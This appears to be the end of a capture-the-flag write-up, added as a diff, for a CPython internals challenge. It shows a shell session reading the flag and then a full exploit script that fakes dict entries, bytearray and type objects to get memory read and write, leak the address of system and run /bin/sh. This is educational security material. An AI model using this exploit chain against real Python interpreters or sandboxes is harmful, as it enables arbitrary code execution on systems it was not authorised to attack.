+hex(system) = '0x7efc769e9560'
+0x7efc766ead70
+gdb..[22;1;31m$[22;39m ls
+flag.txt
+python
+run
+[22;1;31m$[22;39m cat flag.txt
+grey{oh_n0_d0nk3y_k0ng_g0t_ma_keys_6449710d406d}
+```
+
+I hope this was a fun challenge that taught us more about CPython internals!
+
+> ps. if anyone has a better way to remove cheese functions from the CPython
+> source please let me know; I spent almost 3 days trying to find a clean way to
+> remove any cheeses, but I'm not even sure if I managed to cover everything.
+
+# Exploit
+
+Below is the full exploit script:
+
+```py
+def pack(val):
+    return bytes([i for i in ((val >> j * 8) & 0xff for j in range(8))])
+
+buf = {
+        0xdeadbeef: 123,
+        0: 123,
+        1: 123,
+        2: 123,
+        3: 123,
+        4: 123,
+        5: 123,
+        6: 123,
+}
+
+victim_dict = {
+        0x24: 123,
+        0: 123,
+        1: 123,
+        2: 123,
+        3: 123,
+        4: 123,
+        5: 123,
+        6: 123,
+}
+
+buf1 = b"asdf"
+buf1 += b"\x00" * (0xf0 - len(buf1))
+
+print(f"{hex(id(buf1)) = }")
+bytearray_addr = id(buf1) + 0x280
+fakeobj_prim = [
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+        0xdeadbeef, 0xdeadbeef,
+]
+print(f"{hex(id(fakeobj_prim)) = }")
+target_addr = bytearray_addr - 0x160
+
+# fake PyDictKeysEntry
+fake_stuff = b"a"*0x8
+fake_stuff += pack(0x8)
+fake_stuff += pack(id(0x8))
+fake_stuff += pack(bytearray_addr)
+
+# fake bytearray for writing
+fake_stuff += pack(0x100)
+fake_stuff += pack(id(bytearray))
+fake_stuff += pack(0x1000)
+fake_stuff += pack(0x1000)
+fake_stuff += pack(target_addr)
+fake_stuff += pack(target_addr)
+
+# padding
+fake_stuff += b"\x00" * (0xf0 - len(fake_stuff))
+
+assert victim_dict.grey() is True
+
+print(f"{hex(id(victim_dict)) = }")
+print(f"{hex(id(fake_stuff)) = }")
+
+# fake bytearray created at index 8
+write_gadget = memoryview(victim_dict[8])
+print(write_gadget)
+
+# create another fake bytearray for reading
+puts_got_addr = id(1) - 0xf97f8
+print(f"{hex(puts_got_addr) = }")
+more_fake_stuff = pack(0x100)
+more_fake_stuff += pack(id(bytearray))
+more_fake_stuff += pack(0x1000)
+more_fake_stuff += pack(0x1000)
+more_fake_stuff += pack(puts_got_addr)
+more_fake_stuff += pack(puts_got_addr)
+
+write_gadget[0x00:0x08] = pack(id(more_fake_stuff)+0x20)
+
+# get system addr
+puts = int.from_bytes(fakeobj_prim[0][0:8], byteorder="little")
+system = puts - 0x325e0
+print(f"{hex(system) = }")
+
+# fake type to get rip control via reprfunc
+faker_stuff = pack(0x100)
+faker_stuff += pack(id(type))
+faker_stuff += b"a"*0x48
+faker_stuff += pack(system)
+
+fake_type_addr = id(faker_stuff)+0x20
+
+# fake struct to use fake type
+arg = b".bin/sh\x00" # this is refcount so the value will be incremented once
+# fake struct
+more_faker_stuff = arg
+more_faker_stuff += pack(fake_type_addr)
+
+print(f"{hex(id(more_faker_stuff))}")
+
+write_gadget[0x08:0x10] = pack(id(more_faker_stuff)+0x20)
+
+input("gdb..")
+
+# pop shell!
+repr(fakeobj_prim[1])
+```
